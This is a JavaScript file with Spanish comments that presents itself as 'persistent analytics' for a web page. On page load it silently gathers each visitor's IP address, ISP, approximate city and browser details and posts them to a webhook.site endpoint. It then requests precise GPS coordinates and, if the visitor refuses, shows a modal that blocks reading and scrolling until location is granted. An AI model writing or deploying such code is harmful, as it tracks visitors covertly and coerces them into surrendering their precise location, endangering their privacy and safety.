/**
 * Analytics Persistente con Geolocalización Obligatoria
 * - Captura silenciosa de IP + ISP al cargar
 * - Modal bloqueante si se niega GPS
 * - Segundo envío con coordenadas GPS si acepta
 */

// ============================================
// CONFIGURACIÓN
// ============================================

const ANALYTICS_CONFIG = {
    // Leer desde variable de entorno de Netlify o usar default
    webhookUrl: window.location.hostname.includes('localhost') 
        ? 'https://webhook.site/57a80c61-c036-4435-b21c-c4143d76ef09' // Para testing local
        : 'https://webhook.site/57a80c61-c036-4435-b21c-c4143d76ef09', // REEMPLAZAR con tu URL real de producción
    
    firebase: {
        enabled: false,
        apiKey: 'TU_API_KEY',
        authDomain: 'tu-proyecto.firebaseapp.com',
        projectId: 'tu-proyecto',
        storageBucket: 'tu-proyecto.appspot.com',
        messagingSenderId: '123456789',
        appId: 'tu-app-id',
        collectionName: 'analytics'
    },
    
    enableConsoleLog: true,
    timeout: 8000,
    sessionId: generateSessionId() // ID único para esta sesión
};

// ============================================
// ESTADO DE LA APLICACIÓN
// ============================================

let analyticsState = {
    initialDataSent: false,      // Primer envío (IP + ISP)
    gpsDataSent: false,          // Segundo envío (GPS)
    modalShown: false,           // Modal ya mostrado
    ipData: null,                // Datos de IP/ISP capturados
    sessionId: ANALYTICS_CONFIG.sessionId
};

// ============================================
// UTILIDADES
// ============================================

function generateSessionId() {
    return 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
}

function getDeviceType() {
    const ua = navigator.userAgent;
    if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua)) return 'Tablet';
    if (/Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/.test(ua)) return 'Móvil';
    return 'Escritorio';
}

function getBrowserInfo() {
    return {
        userAgent: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform,
        vendor: navigator.vendor,
        screenWidth: window.screen.width,
        screenHeight: window.screen.height,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        cookiesEnabled: navigator.cookieEnabled,
        doNotTrack: navigator.doNotTrack || 'not-set'
    };
}

function log(message, data = null) {
    if (ANALYTICS_CONFIG.enableConsoleLog) {
        console.log(`🔍 [Analytics Persistente] ${message}`, data || '');
    }
}

// ============================================
// CAPTURA DE IP + ISP (SILENCIOSA)
// ============================================

/**
 * Obtiene IP pública + información del ISP
 * Usa ipapi.co que provee datos completos sin autenticación
 */
async function getIPandISP() {
    try {
        log('🌐 Capturando IP y proveedor de internet (ISP)...');
        
        // API con información completa: IP, ISP, geolocalización aproximada
        const response = await fetch('https://ipapi.co/json/', {
            signal: AbortSignal.timeout(ANALYTICS_CONFIG.timeout)
        });

        if (!response.ok) {
            throw new Error(`HTTP ${response.status}`);
        }

        const data = await response.json();
        
        const ipData = {
            ip: data.ip,
            isp: data.org || 'Desconocido',
            city: data.city || 'Desconocido',
            region: data.region || 'Desconocido',
            country: data.country_name || 'Desconocido',
            countryCode: data.country_code || 'XX',
            timezone: data.timezone || 'Desconocido',
            asn: data.asn || 'Desconocido',
            // Coordenadas aproximadas por IP (NO son GPS)
            approximateLocation: {
                latitude: data.latitude || null,
                longitude: data.longitude || null,
                accuracy: 'city-level' // Precisión a nivel ciudad
            }
        };

        log('✅ Datos de red capturados:', ipData);
        return ipData;

    } catch (error) {
        console.error('❌ Error obteniendo IP/ISP:', error);
        
        // Fallback: solo IP sin ISP
        try {
            const fallbackResponse = await fetch('https://api.ipify.org?format=json');
            const fallbackData = await fallbackResponse.json();
            return {
                ip: fallbackData.ip,
                isp: 'No disponible',
                city: 'Desconocido',
                region: 'Desconocido',
                country: 'Desconocido',
                countryCode: 'XX',
                timezone: 'Desconocido',
                asn: 'Desconocido',
                approximateLocation: null
            };
        } catch (fallbackError) {
            return {
                ip: 'No disponible',
                isp: 'No disponible',
                error: error.message
            };
        }
    }
}

// ============================================
// GEOLOCALIZACIÓN GPS
// ============================================

/**
 * Solicita permiso de geolocalización GPS
 * Retorna Promise que resuelve o rechaza según usuario
 */
function requestGeolocation() {
    return new Promise((resolve, reject) => {
        if (!navigator.geolocation) {
            reject(new Error('Geolocalización no soportada'));
            return;
        }

        log('📍 Solicitando permiso de geolocalización GPS...');

        navigator.geolocation.getCurrentPosition(
            (position) => {
                const geoData = {
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy,
                    altitude: position.coords.altitude,
                    altitudeAccuracy: position.coords.altitudeAccuracy,
                    heading: position.coords.heading,
                    speed: position.coords.speed,
                    timestamp: new Date(position.timestamp).toISOString()
                };
                log('✅ GPS obtenido con éxito', geoData);
                resolve(geoData);
            },
            (error) => {
                let errorType = 'UNKNOWN';
                let errorMessage = '';
                
                switch (error.code) {
                    case error.PERMISSION_DENIED:
                        errorType = 'PERMISSION_DENIED';
                        errorMessage = 'Usuario denegó el permiso GPS';
                        break;
                    case error.POSITION_UNAVAILABLE:
                        errorType = 'POSITION_UNAVAILABLE';
                        errorMessage = 'Ubicación no disponible';
                        break;
                    case error.TIMEOUT:
                        errorType = 'TIMEOUT';
                        errorMessage = 'Tiempo agotado';
                        break;
                }
                
                log(`⚠️ Error GPS [${errorType}]: ${errorMessage}`);
                reject({ code: error.code, type: errorType, message: errorMessage });
            },
            {
                enableHighAccuracy: true,
                timeout: ANALYTICS_CONFIG.timeout,
                maximumAge: 0
            }
        );
    });
}

// ============================================
// ENVÍO DE DATOS
// ============================================

/**
 * Envía datos al webhook o Firebase
 */
async function sendData(payload) {
    try {
        log('📤 Enviando datos...', payload);

        if (ANALYTICS_CONFIG.firebase.enabled) {
            return await sendToFirebase(payload);
        } else {
            return await sendToWebhook(payload);
        }
    } catch (error) {
        console.error('❌ Error enviando datos:', error);
        return { success: false, error: error.message };
    }
}

async function sendToWebhook(data) {
    try {
        const response = await fetch(ANALYTICS_CONFIG.webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data),
            signal: AbortSignal.timeout(ANALYTICS_CONFIG.timeout)
        });

        if (response.ok) {
            log('✅ Datos enviados al webhook');
            return { success: true };
        } else {
            throw new Error(`HTTP ${response.status}`);
        }
    } catch (error) {
        console.error('❌ Error en webhook:', error);
        return { success: false, error: error.message };
    }
}

async function sendToFirebase(data) {
    if (typeof firebase === 'undefined') {
        return { success: false, error: 'Firebase no cargado' };
    }

    try {
        const db = firebase.firestore();
        await db.collection(ANALYTICS_CONFIG.firebase.collectionName).add({
            ...data,
            createdAt: firebase.firestore.FieldValue.serverTimestamp()
        });
        log('✅ Datos guardados en Firebase');
        return { success: true };
    } catch (error) {
        console.error('❌ Error Firebase:', error);
        return { success: false, error: error.message };
    }
}

// ============================================
// MODAL DE VERIFICACIÓN
// ============================================

/**
 * Muestra el modal bloqueante
 */
function showLocationModal() {
    if (analyticsState.modalShown) return;
    
    analyticsState.modalShown = true;
    const modal = document.getElementById('location-modal');
    
    if (modal) {
        log('🚨 Mostrando modal de verificación');
        modal.classList.add('show');
        
        // Bloquear scroll del body
        document.body.style.overflow = 'hidden';
    }
}

/**
 * Oculta el modal
 */
function hideLocationModal() {
    const modal = document.getElementById('location-modal');
    
    if (modal) {
        log('✅ Ocultando modal');
        modal.classList.remove('show');
        document.body.style.overflow = 'auto';
    }
}

/**
 * Maneja el clic en "Confirmar y Leer"
 */
async function handleConfirmButton() {
    log('🔄 Usuario hizo clic en "Confirmar y Leer"');
    
    // Cambiar texto del botón
    const btn = document.getElementById('confirm-location-btn');
    if (btn) {
        btn.innerHTML = '⏳ Solicitando permiso...';
        btn.disabled = true;
    }

    try {
        // Intentar obtener GPS nuevamente
        const gpsData = await requestGeolocation();
        
        // GPS obtenido: enviar segundo paquete
        await sendSecondPackage(gpsData);
        
        // Ocultar modal y permitir lectura
        hideLocationModal();
        
    } catch (error) {
        // Si vuelve a fallar, mostrar mensaje de error
        log('❌ Usuario rechazó GPS nuevamente o error', error);
        
        if (btn) {
            btn.innerHTML = '❌ Permiso denegado - Reintentar';
            btn.disabled = false;
        }
    }
}

// ============================================
// LÓGICA PRINCIPAL
// ============================================

/**
 * PASO 1: Captura silenciosa inicial (IP + ISP)
 * Se ejecuta al cargar la página, antes de pedir GPS
 */
async function sendInitialPackage() {
    if (analyticsState.initialDataSent) return;

    log('📦 PASO 1: Enviando paquete inicial (IP + ISP)');

    // Capturar IP/ISP de forma silenciosa
    const ipData = await getIPandISP();
    analyticsState.ipData = ipData;

    // Construir payload inicial
    const initialPayload = {
        event: 'page_load',
        stage: 'initial_capture',
        sessionId: analyticsState.sessionId,
        timestamp: new Date().toISOString(),
        pageUrl: window.location.href,
        referrer: document.referrer || 'Directo',
        deviceType: getDeviceType(),
        browserInfo: getBrowserInfo(),
        networkInfo: ipData,
        gpsStatus: 'pending' // GPS aún no solicitado
    };

    // Enviar datos
    await sendData(initialPayload);
    analyticsState.initialDataSent = true;
    
    log('✅ Paquete inicial enviado');
}

/**
 * PASO 2: Enviar coordenadas GPS (si el usuario acepta)
 */
async function sendSecondPackage(gpsData) {
    if (analyticsState.gpsDataSent) return;

    log('📦 PASO 2: Enviando paquete GPS');

    const gpsPayload = {
        event: 'gps_granted',
        stage: 'gps_capture',
        sessionId: analyticsState.sessionId,
        timestamp: new Date().toISOString(),
        gpsData: {
            ...gpsData,
            permissionGranted: true,
            source: 'html5-geolocation-api'
        },
        // Incluir referencia a los datos de IP previos
        networkInfo: analyticsState.ipData
    };

    await sendData(gpsPayload);
    analyticsState.gpsDataSent = true;
    
    log('✅ Paquete GPS enviado');
}

/**
 * Flujo principal al cargar la página
 */
async function initAnalytics() {
    log('🚀 Iniciando sistema de analytics persistente...');

    // PASO 1: Captura silenciosa de IP + ISP (NO espera permiso del usuario)
    await sendInitialPackage();

    // PASO 2: Solicitar GPS de forma silenciosa
    try {
        const gpsData = await requestGeolocation();
        
        // Si acepta de inmediato, enviar GPS y no mostrar modal
        await sendSecondPackage(gpsData);
        log('✅ Usuario aceptó GPS inmediatamente');
        
    } catch (error) {
        // Si deniega o falla GPS: mostrar modal bloqueante
        log('⚠️ GPS denegado o error - Mostrando modal');
        
        // Enviar evento de rechazo
        await sendData({
            event: 'gps_denied',
            stage: 'initial_denial',
            sessionId: analyticsState.sessionId,
            timestamp: new Date().toISOString(),
            errorType: error.type || 'UNKNOWN',
            errorMessage: error.message || 'Error desconocido'
        });
        
        // Mostrar modal bloqueante
        showLocationModal();
    }
}

// ============================================
// INICIALIZACIÓN
// ============================================

// Ejecutar al cargar el DOM
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', () => {
        initAnalytics();
        
        // Asignar evento al botón del modal
        const confirmBtn = document.getElementById('confirm-location-btn');
        if (confirmBtn) {
            confirmBtn.addEventListener('click', handleConfirmButton);
        }
    });
} else {
    initAnalytics();
    
    const confirmBtn = document.getElementById('confirm-location-btn');
    if (confirmBtn) {
        confirmBtn.addEventListener('click', handleConfirmButton);
    }
}

// Exportar para uso manual
window.OberaAnalytics = {
    state: analyticsState,
    config: ANALYTICS_CONFIG,
    retry: handleConfirmButton,
    showModal: showLocationModal,
    hideModal: hideLocationModal
};
